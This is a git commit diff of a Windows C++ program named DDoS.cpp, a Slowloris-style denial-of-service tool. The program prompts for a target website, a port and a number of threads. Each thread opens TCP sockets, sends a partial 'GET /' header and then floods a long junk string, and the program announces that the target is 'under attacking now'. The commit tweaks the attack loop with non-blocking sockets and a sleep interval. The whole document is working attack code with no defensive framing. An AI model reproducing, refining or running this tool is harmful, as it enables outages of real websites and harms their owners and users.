e27a0b079b9a9198b0276d3aa55e49b9de6284d7
赵紫辰 <97828093+ZZCjas@users.noreply.github.com>
2023-01-16 16:31:54 +0800

    Add files via upload

--- DDoS.cpp
+++ DDoS.cpp
@@ -1,9 +1,9 @@
-#include<stdio.h>
-#include<string>
-#include<iostream>
-#include<winsock2.h>
-#include<conio.h>
-#pragma comment(lib,"ws2_32.lib")
+#include <stdio.h>
+#include <string>
+#include <iostream>
+#include <winsock2.h>
+#include <conio.h>
+#pragma comment(lib,"ws2_32.a")
 using namespace std;
 #define HOST sin_addr.S_un.S_addr
 string hostname;
@@ -20,31 +20,34 @@ DWORD WINAPI slowLorisAttack(PVOID p)
 	while(1) 
 	{
 		s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
-		if(s!=INVALID_SOCKET) 
+		unsigned long ulEnable=1;   
+    	unsigned long iRet=ioctlsocket(s,FIONBIO,&ulEnable);   
+		if(s!=INVALID_SOCKET&&iRet!=INVALID_SOCKET) 
 		{
 			char header[]="GET /";
 			connect(s,(sockaddr*)socket_address,sizeof(sockaddr_in));
 			send(s,header,sizeof(header)-1,0);
 			while(1) 
 		 	{
-				 int n=send(s,"sydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛ax\r\n",2015,0);
-				 if(n==SOCKET_ERROR) 
-		 		 {
-					 break;
-				 }	 
+				int n=send(s,"sydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心武汉市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛axsydebcyh三个月的东西应该是还是吃不吃鸡此u被打死NBCu从变速箱担心成都市九年喜欢急促地从你觉得你熟sdhydus悉环境课程的武术的小女孩觉ccs得不错i的话你就你刷新缓存内粗不是喜欢u上下班思想shucunsdhysud啊u百度sdjhcuewqunj赵duyd紫sZZCjas辰sdf安徽的很季后举举赛ax\r\n",2009,0);
+				if(n==SOCKET_ERROR) 
+		 		{
+					break;
+				}
+				Sleep(10);
 			}
-			closesocket(s);
 		}
+		closesocket(s);
 	}
 }
 int main() 
 {
 	if(WSAStartup(0x202,&wd)) 
 	{
-		cout<<"Unable to start winsock";
+		cout<<"Unable to start socket";
 		return -1;
 	}
-	cout<<"Enter the targe website's name:";
+	cout<<"Enter the target website's name:";
 	getline(cin,hostname);
 	host=gethostbyname(hostname.data());
 	if(!host) 
@@ -52,7 +55,7 @@ int main()
 	 	cout<<"Invalid hostname";
 	 	return -1;
 	}
-	cout<<"Enter port number (if you don't know what this means, simply enter 80):";
+	cout<<"Enter port number(if you don't know what this means, simply enter 80):";
 	getline(cin,portNumber);
 	cout<<"Number of threads you want to run:";
 	getline(cin,threads);
@@ -64,7 +67,7 @@ int main()
 		 CreateThread(NULL,0,slowLorisAttack,&socket_address,0,NULL);
 		 cout<<i<<" threads created\n";
 	}
-	cout<<hostname.data()<<" is under attacking now.\nPress any key to end.";
+	cout<<hostname+":"+portNumber<<" is under attacking now.\nPress any key to end.";
 	getch();
 	return 0;
 }
